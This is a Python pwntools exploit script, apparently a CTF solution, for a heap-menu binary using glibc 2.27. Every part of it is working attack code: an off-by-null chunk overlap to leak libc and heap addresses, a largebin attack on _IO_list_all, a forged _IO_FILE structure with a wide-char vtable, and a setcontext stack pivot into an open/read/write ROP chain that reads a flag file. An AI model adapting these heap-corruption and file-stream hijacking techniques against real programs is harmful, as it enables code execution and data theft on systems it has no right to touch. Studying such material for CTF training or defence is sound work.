#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./OBN27-16')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./OBN27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x418) #0 0x250
add(0x418) #1 0x670
add(0x4f0) #2 0xa90

add(0x418) #3 0xf90

add(0x418) #4 0x13b0
add(0x428) #5 0x17d0
add(0x4f0) #6 0x1c00

add(0x418) #7 0x2100

delete(0)
edit(1, 'A'*0x410+p64(0x840)) #off by null 修改chunk2 size
delete(2) #chunk0 1 2合并

add(0x418) #8 use chunk0
show(1)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
pr('libcbase',libcbase)

setcontext_door = libcbase + libc.sym['setcontext'] + 53
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
_IO_list_all = libcbase + libc.sym['_IO_list_all']
bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2625 # syscall ; ret
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret
gadget = libcbase + 0x157a40
ret = prdi_ret + 1 # ret
'''
mov rdi, qword ptr [rbx]; 
mov rax, qword ptr [rdi + 8]; 
call qword ptr [rax + 0x20];
'''

add(0x418) #9 use chunk1
add(0x4f0) #10 use chunk2

delete(4)
edit(5, 'A'*0x420+p64(0x850)) #off by null 修改chunk6 size
delete(6) #chunk4 5 6合并，可控制 chunk5

add(0x418) #11 use chunk4
add(0x428) #12 use chunk5
add(0x4f0) #13 use chunk6

delete(12)
add(0x430) #14 0x2520,让chunk5 进入 largebin
delete(9) #chunk1放入unsortedbin

show(5)
heapbase = u64(p.recv(24)[-8:].ljust(8, "\x00")) - 0x17d0
pr('heapbase',heapbase)

edit(5, p64(0)*3+p64(_IO_list_all-0x20))
add(0x440) #15 0x2960,chunk1 地址写入 _IO_list_all

#=========================fake_IO_FILE=========================

IO_FILE_addr = heapbase + 0x670
_IO_wdoallocbuf_addr = IO_FILE_addr + 0x130

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base, _wide_data->_IO_write_base = 0
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(1) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end, _wide_data->_IO_buf_base = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr) # _wide_data
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps) # vtable = _IO_wfile_overflow
fake_IO_FILE  = fake_IO_FILE.ljust(0x120,'\x00')

#======================fake_IO_wdoallocbuf==========================

fake_IO_wdoallocbuf  = p64(_IO_wdoallocbuf_addr)
fake_IO_wdoallocbuf  = fake_IO_wdoallocbuf.ljust(0x68, '\x00')
fake_IO_wdoallocbuf += p64(gadget)

#==============================================================

context_addr = heapbase + 0x260
orw_addr = context_addr + 0x100
flag_addr = context_addr + 0x200

payload  = p64(0) + p64(context_addr) + p64(0)*2 + p64(setcontext_door)
payload  = payload.ljust(0xa0,'\x00')
payload += p64(orw_addr) #rsp
payload += p64(ret) #rcx
payload  = payload.ljust(0x100,'\x00')

#open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'
payload  = payload.ljust(0x410,'\x00')

#==============================================================

edit(8, payload + p64(context_addr))
payload = fake_IO_FILE + fake_IO_wdoallocbuf
edit(1, payload)
#gdb.attach(p)
#pause()

p.sendlineafter(':','5') # 触发exit()
p.interactive()